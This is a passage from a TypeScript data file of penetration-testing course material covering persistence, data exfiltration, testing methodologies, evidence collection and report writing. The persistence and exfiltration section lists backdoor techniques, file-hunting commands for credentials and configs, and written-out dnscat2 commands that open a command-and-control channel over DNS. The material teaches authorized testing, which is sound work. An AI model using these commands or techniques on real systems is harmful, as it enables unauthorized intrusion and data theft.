          'APT-style lateral movement: real adversaries use built-in OS tools (RDP, WMI, PsExec, PowerShell remoting) for lateral movement rather than deploying additional tools — penetration testers simulate this with CrackMapExec, Impacket, and Evil-WinRM to demonstrate realistic attack chains',
        ],
      },
      {
        id: '12-3',
        name: 'Persistence & Data Exfiltration',
        description:
          'Establishing persistent access to compromised systems that survives reboots and detection attempts, and extracting valuable data from the target network while evading data loss prevention controls.',
        keyPoints: [
          'Linux persistence: SSH authorized_keys injection, cron job reverse shells, .bashrc/.profile backdoors, systemd service creation, LD_PRELOAD rootkits, and PAM backdoors — each method has different stealth levels and survival characteristics; layering multiple mechanisms provides redundancy',
          'Windows persistence: registry Run keys, scheduled tasks, WMI event subscriptions, DLL side-loading, service creation, COM object hijacking, and Startup folder shortcuts — tools like SharPersist automate the creation and cleanup of common Windows persistence mechanisms',
          'Data discovery: identify valuable data before exfiltrating — "find / -name *.conf -o -name *.cfg -o -name *.bak -o -name *.sql 2>/dev/null", database dumps, credential files, SSH keys, browser saved passwords, email archives; on Windows: "dir /s /b *.docx *.xlsx *.pdf *.pst" and DPAPI decryption for browser credentials',
          'Exfiltration techniques: HTTP/HTTPS (curl, wget to attacker web server), DNS tunneling (dnscat2, iodine — encodes data in DNS queries that bypass most firewalls), ICMP tunneling (icmpsh), cloud storage (upload to S3/GDrive via API), and steganography (hide data in image files) — the choice depends on what protocols the network allows outbound',
          'Cleanup obligations: penetration testers MUST remove all persistence mechanisms, uploaded tools, and created accounts after the engagement — document every change made to the target environment and verify cleanup; failure to clean up is a serious professional and legal liability',
        ],
        tradeoffs: [
          'Aggressive persistence (multiple mechanisms, rootkit-level) is harder to detect and remove but creates more artifacts and risk of disrupting the system — for penetration tests, use the minimum persistence needed and document everything for cleanup',
          'Data exfiltration over standard protocols (HTTPS, DNS) blends with normal traffic but DLP solutions may inspect content — encrypted tunnels and data chunking help bypass content inspection but add complexity',
          'DNS tunneling bypasses most firewalls (DNS is almost always allowed outbound) but is slow (limited by DNS query/response sizes and rates) and can be detected by DNS analytics tools that flag abnormally long subdomains or high query volumes',
        ],
        realWorld: [
          'Red team persistence layering: create a scheduled task (survives reboot, moderate stealth), WMI event subscription (survives reboot, high stealth), and an SSH key in authorized_keys (simple, immediate re-access) — if one mechanism is discovered and removed, the others maintain access',
          'APT data exfiltration patterns: real threat actors use DNS tunneling (APT34/OilRig), steganography in social media images (APT29/Turla), and cloud storage services (APT10) — penetration testers replicate these techniques to test the organization\'s ability to detect data exfiltration',
          'Dnscat2 exfiltration: "dnscat2-server target-domain.com" on the attacker, "dnscat target-domain.com" on the compromised host — creates a C2 channel and file transfer capability entirely over DNS queries, which pass through most firewalls that allow DNS resolution',
          'Post-engagement cleanup verification: the tester provides a detailed cleanup report listing every file uploaded, account created, configuration changed, and persistence mechanism installed — the client verifies cleanup independently and both parties sign off on complete removal',
        ],
      },
    ],
  },
  {
    id: 13,
    title: 'Reporting & Methodology',
    part: 4,
    partTitle: 'Advanced Topics',
    summary:
      'The professional framework surrounding penetration testing — following established methodologies, collecting evidence throughout the engagement, writing effective reports, and practicing responsible disclosure.',
    concepts: [
      {
        id: '13-1',
        name: 'Penetration Testing Methodologies (PTES, OSSTMM, OWASP Testing Guide)',
        description:
          'Established frameworks that define the phases, activities, and deliverables of a professional penetration test — ensuring comprehensive coverage, consistency, and industry-recognized standards.',
        keyPoints: [
          'PTES (Penetration Testing Execution Standard): defines seven phases — (1) Pre-engagement (scoping, rules of engagement, authorization), (2) Intelligence Gathering (OSINT, reconnaissance), (3) Threat Modeling, (4) Vulnerability Analysis, (5) Exploitation, (6) Post-Exploitation, (7) Reporting — the most widely referenced pentest methodology',
          'OWASP Testing Guide: the definitive reference for web application security testing — v4.2 defines 91 test cases organized into 11 categories (information gathering, configuration, identity management, authentication, authorization, session management, input validation, error handling, cryptography, business logic, client-side) with detailed procedures for each test',
          'OSSTMM (Open Source Security Testing Methodology Manual): a scientific methodology focused on measuring the "attack surface" — defines operational security metrics (rav: risk assessment values) and is more rigorous/quantitative than PTES; used in environments requiring measurable security assurance',
          'NIST SP 800-115 (Technical Guide to Information Security Testing): the US government standard for penetration testing — covers planning, discovery, attack execution, and reporting; required for US federal system assessments and often referenced in compliance frameworks',
          'Engagement scoping: before any testing begins, define and document the scope (IP ranges, domains, applications), rules of engagement (testing hours, off-limits systems, emergency contacts), authorization (signed statement of work, get-out-of-jail letter), and communication channels — improper scoping is the source of most penetration test disputes',
        ],
        tradeoffs: [
          'Strict methodology adherence ensures consistency and completeness but can be time-consuming and rigid — experienced testers adapt the methodology to the engagement scope, timeline, and client needs while maintaining core principles',
          'PTES is the most practical and widely adopted but is not frequently updated — OWASP Testing Guide is more current for web application testing; the best approach is to use PTES as the framework and OWASP as the detailed web testing reference',
          'Methodology compliance is increasingly required by clients and auditors but adding methodology documentation to every engagement increases overhead — develop templates and checklists that streamline documentation without sacrificing quality',
        ],
        realWorld: [
          'Professional penetration testing firms (NCC Group, Rapid7, Trustwave, Bishop Fox) base their testing methodologies on PTES/OWASP and customize them with firm-specific procedures, quality controls, and reporting templates',
          'OSCP certification follows a PTES-like structure: students must perform reconnaissance, vulnerability analysis, exploitation, post-exploitation, and reporting within the 24-hour exam — the methodology ensures structured, efficient testing under time pressure',
          'PCI-DSS compliance requires annual penetration testing following a defined methodology — the PCI Council published a penetration testing guidance document that references PTES and NIST SP 800-115 as acceptable frameworks',
          'CREST (Council of Registered Ethical Security Testers) certifications require demonstrating methodology adherence — CREST-certified testers must follow documented methodologies and produce reports meeting CREST quality standards for each engagement',
        ],
      },
      {
        id: '13-2',
        name: 'Evidence Collection & Documentation',
        description:
          'Systematically collecting, organizing, and preserving evidence throughout a penetration test — screenshots, command output, request/response pairs, and timeline documentation that support every finding in the final report.',
        keyPoints: [
          'Screenshot discipline: capture evidence at every significant step — proof of vulnerability (the vulnerable response), proof of exploitation (the shell, the data accessed), and proof of impact (domain admin access, sensitive data, critical system access); include timestamps, target IP/URL, and tool output in every screenshot',
          'Command logging: record every command executed during the engagement — "script -a engagement_log.txt" records entire terminal sessions; tmux logging ("set-option -g history-limit 50000") preserves scrollback; structured note-taking tools (CherryTree, Obsidian, Notion) organize findings by host/phase',
          'Burp Suite logging: save the Burp project file and export relevant request/response pairs for every web vulnerability — the request showing the vulnerability and the response proving exploitation are the minimum evidence; include before/after request pairs for impact demonstration',
          'Timeline documentation: maintain a chronological log of all testing activities — when you started scanning a host, when you found a vulnerability, when you exploited it, when you accessed sensitive data; this timeline is essential for incident response if testing causes an unexpected issue',
          'Evidence organization: structure evidence by finding — for each vulnerability, create a folder containing screenshots, command output, request/response files, affected hosts, and remediation notes; this organization directly maps to the report structure and makes report writing efficient',
        ],
        tradeoffs: [
          'Thorough documentation takes significant time during the engagement (10-20% overhead) but saves much more time during report writing — testers who document as they go produce higher-quality reports faster than those who try to reconstruct their testing after the fact',
          'Automatic logging tools (script, tmux logging) capture everything but produce large, unstructured files — they serve as a backup, not a replacement for deliberate evidence collection and organization',
          'Over-documentation of non-issues wastes time, while under-documentation of findings leads to weak reports — focus documentation effort on confirmed vulnerabilities, near-misses, and interesting negative findings (tests that should have found vulnerabilities but did not, indicating good security controls)',
        ],
        realWorld: [
          'CherryTree is the most popular note-taking tool among penetration testers — its hierarchical tree structure maps naturally to engagement organization (Host → Port → Service → Vulnerability → Evidence); OSCP students use CherryTree templates specifically designed for exam documentation',
          'Professional pentest firms use engagement management platforms (PlexTrac, AttackForge, Dradis) that combine evidence collection, collaboration, vulnerability tracking, and report generation in a single tool — replacing manual CherryTree/document-based workflows for team-based engagements',
          'The "screenshot or it did not happen" principle: clients and their auditors will challenge findings without clear evidence — a finding supported by timestamped screenshots, raw command output, and request/response pairs is unchallengeable',
          'Incident scenarios: if your testing accidentally causes a service outage, the timeline documentation proves what you were doing when the outage occurred and whether your testing was the cause — without this documentation, you may be blamed for coincidental failures',
        ],
      },
      {
        id: '13-3',
        name: 'Report Writing & Responsible Disclosure',
        description:
          'Writing effective penetration test reports that communicate findings to both technical and executive audiences, and following responsible disclosure practices when vulnerabilities are discovered outside of authorized engagements.',
        keyPoints: [
          'Report structure: (1) Executive Summary (business risk in non-technical language, 1-2 pages for C-suite), (2) Scope & Methodology (what was tested and how), (3) Findings Summary (table of vulnerabilities sorted by risk rating), (4) Detailed Findings (each vulnerability with description, evidence, impact, reproduction steps, and remediation), (5) Appendices (tool output, raw data)',
          'Risk rating: each finding needs a severity rating — most firms use CVSS Base score adjusted for environmental context (CVSS Environmental score) or a custom framework (Critical/High/Medium/Low/Informational); the risk rating must reflect actual business impact, not just technical severity',
          'Finding format: each vulnerability should include: Title, Risk Rating, Affected Systems, Description (what is the vulnerability), Evidence (screenshots, command output), Impact (what an attacker can achieve), Reproduction Steps (step-by-step guide for verification), and Remediation (specific, actionable fix)',
          'Executive summary writing: translate technical findings into business risk — "we achieved domain administrator access, giving us complete control of all 5,000 workstations and access to all corporate data including customer PII" is more impactful than "we exploited MS17-010 to get a SYSTEM shell and extracted NTLM hashes from NTDS.dit"',
          'Responsible disclosure: when discovering vulnerabilities outside an engagement (in products, open-source software, or internet-facing services), follow coordinated disclosure: (1) report to the vendor/owner privately, (2) provide a reasonable remediation timeline (90 days is standard), (3) work with the vendor on a fix, (4) publish the advisory after the fix is available or the deadline expires',
        ],
        tradeoffs: [
          'Detailed technical findings are essential for the remediation team but overwhelming for executive readers — solve this with the executive summary (high-level business impact) and detailed findings (technical specifics) structure that serves both audiences in one document',
          'CVSS provides a standardized scoring framework but does not account for business context — a CVSS 4.0 information disclosure in a payment processing system may be more critical to the business than a CVSS 8.8 RCE on an isolated development server; adjust ratings with environmental scoring and business context',
          'Responsible disclosure protects users but can create tension with vendors who may not want vulnerabilities published — established disclosure policies (Google Project Zero\'s 90-day deadline, CERT/CC coordination) provide frameworks that balance vendor remediation time with public safety',
        ],
        realWorld: [
          'The Pwn2Own competition follows responsible disclosure: researchers demonstrate zero-day exploits during the contest, vendors are immediately notified, and details are withheld until patches are available — this model incentivizes vulnerability research while protecting users',
          'Professional report quality matters: clients evaluate penetration testing firms significantly based on report quality — a clear, well-evidenced, actionable report builds client trust and generates repeat business; poor reports (scanner dumps, unclear findings, missing remediation) damage the firm\'s reputation',
          'Bug bounty platforms (HackerOne, Bugcrowd, Intigriti) formalize responsible disclosure: researchers submit vulnerability reports through the platform, the vendor triages and fixes, and the researcher receives recognition and financial reward — the platform mediates any disputes about severity or validity',
          'CVE (Common Vulnerabilities and Exposures) assignment: for significant vulnerabilities in widely-used software, request a CVE number through MITRE or a CNA (CVE Numbering Authority) — a CVE provides a universal identifier for the vulnerability, ensures it appears in vulnerability databases, and helps the community track remediation',
        ],
      },
    ],
  },
];

export const chapters: Chapter[] = topics;

export function getChapter(id: number): Chapter | undefined {
  return chapters.find((ch) => ch.id === id);
}
